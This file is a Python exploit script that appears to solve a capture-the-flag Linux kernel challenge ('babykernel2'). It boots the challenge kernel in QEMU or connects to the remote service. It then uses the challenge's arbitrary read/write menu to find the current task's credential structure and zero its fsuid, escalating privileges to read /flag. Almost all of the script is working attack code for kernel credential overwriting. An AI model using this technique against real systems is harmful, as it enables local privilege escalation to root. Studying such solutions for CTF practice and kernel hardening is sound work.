#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bzimage = './bzImage'
initram = './initramfs.cpio.gz'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv': \
    'qemu-system-x86_64 -s -cpu max,+smap,+smep,check -m 64 -nographic -kernel {} -initrd {} -append'.format(bzimage, initram).split() + ["nokaslr console=ttyS0 init='/init'"]}, \
                        local   = {'argv': \
    'qemu-system-x86_64 -monitor /dev/null -cpu max,+smap,+smep,check -m 64 -nographic -kernel {} -initrd {}.bak -append'.format(bzimage, initram).split() + ["console=ttyS0 init='/init'"]}, \
                        remote  = {'host':'babykernel2.forfuture.fluxfingers.net', 'port':1337})
env.select()

#==========

kernel = ELF('vmlinux')
addr_kernel_current_task    = kernel.symbols['current_task']

#==========

def attack(conn, **kwargs):
    bk = BabyKernel2(conn)

    addr_kernel_current    = bk.do_read(addr_kernel_current_task)
    addr_kernel_cred       = bk.do_read(addr_kernel_current + 0x400)
    info('addr_kernel_cred  = 0x{:08x}'.format(addr_kernel_cred))

    uid_gid                = bk.do_read(addr_kernel_cred + 0x4)
    fsuid_suid             = bk.do_read(addr_kernel_cred + 0x1c)
    info('current   uid : {},  gid : {}'.format(uid_gid&((1<<32)-1), uid_gid>>32))
    info('current feuid : {}, suid : {}'.format(fsuid_suid&((1<<32)-1), fsuid_suid>>32))
    
    bk.do_write(addr_kernel_cred + 0x1c, 0)
    bk.do_readfile('/flag')

class BabyKernel2:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        if env.check('debug'):
            self.sendlineafter('# ', 'su user -c /client_kernel_baby_2')

    def do_read(self, ofs):
        self.sendlineafter('> ', '1')
        self.sendlineafter('> ', hex(ofs))
        self.recvuntil('is: ')
        return int(self.recvuntil('\r\n', drop=True), 16)

    def do_write(self, ofs, value):
        self.sendlineafter('> ', '2')
        self.sendlineafter('> ', hex(ofs))
        self.sendlineafter('> ', hex(value))

    def do_readfile(self, fname):
        self.sendlineafter('> ', '4')
        self.sendlineafter('> ', fname)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
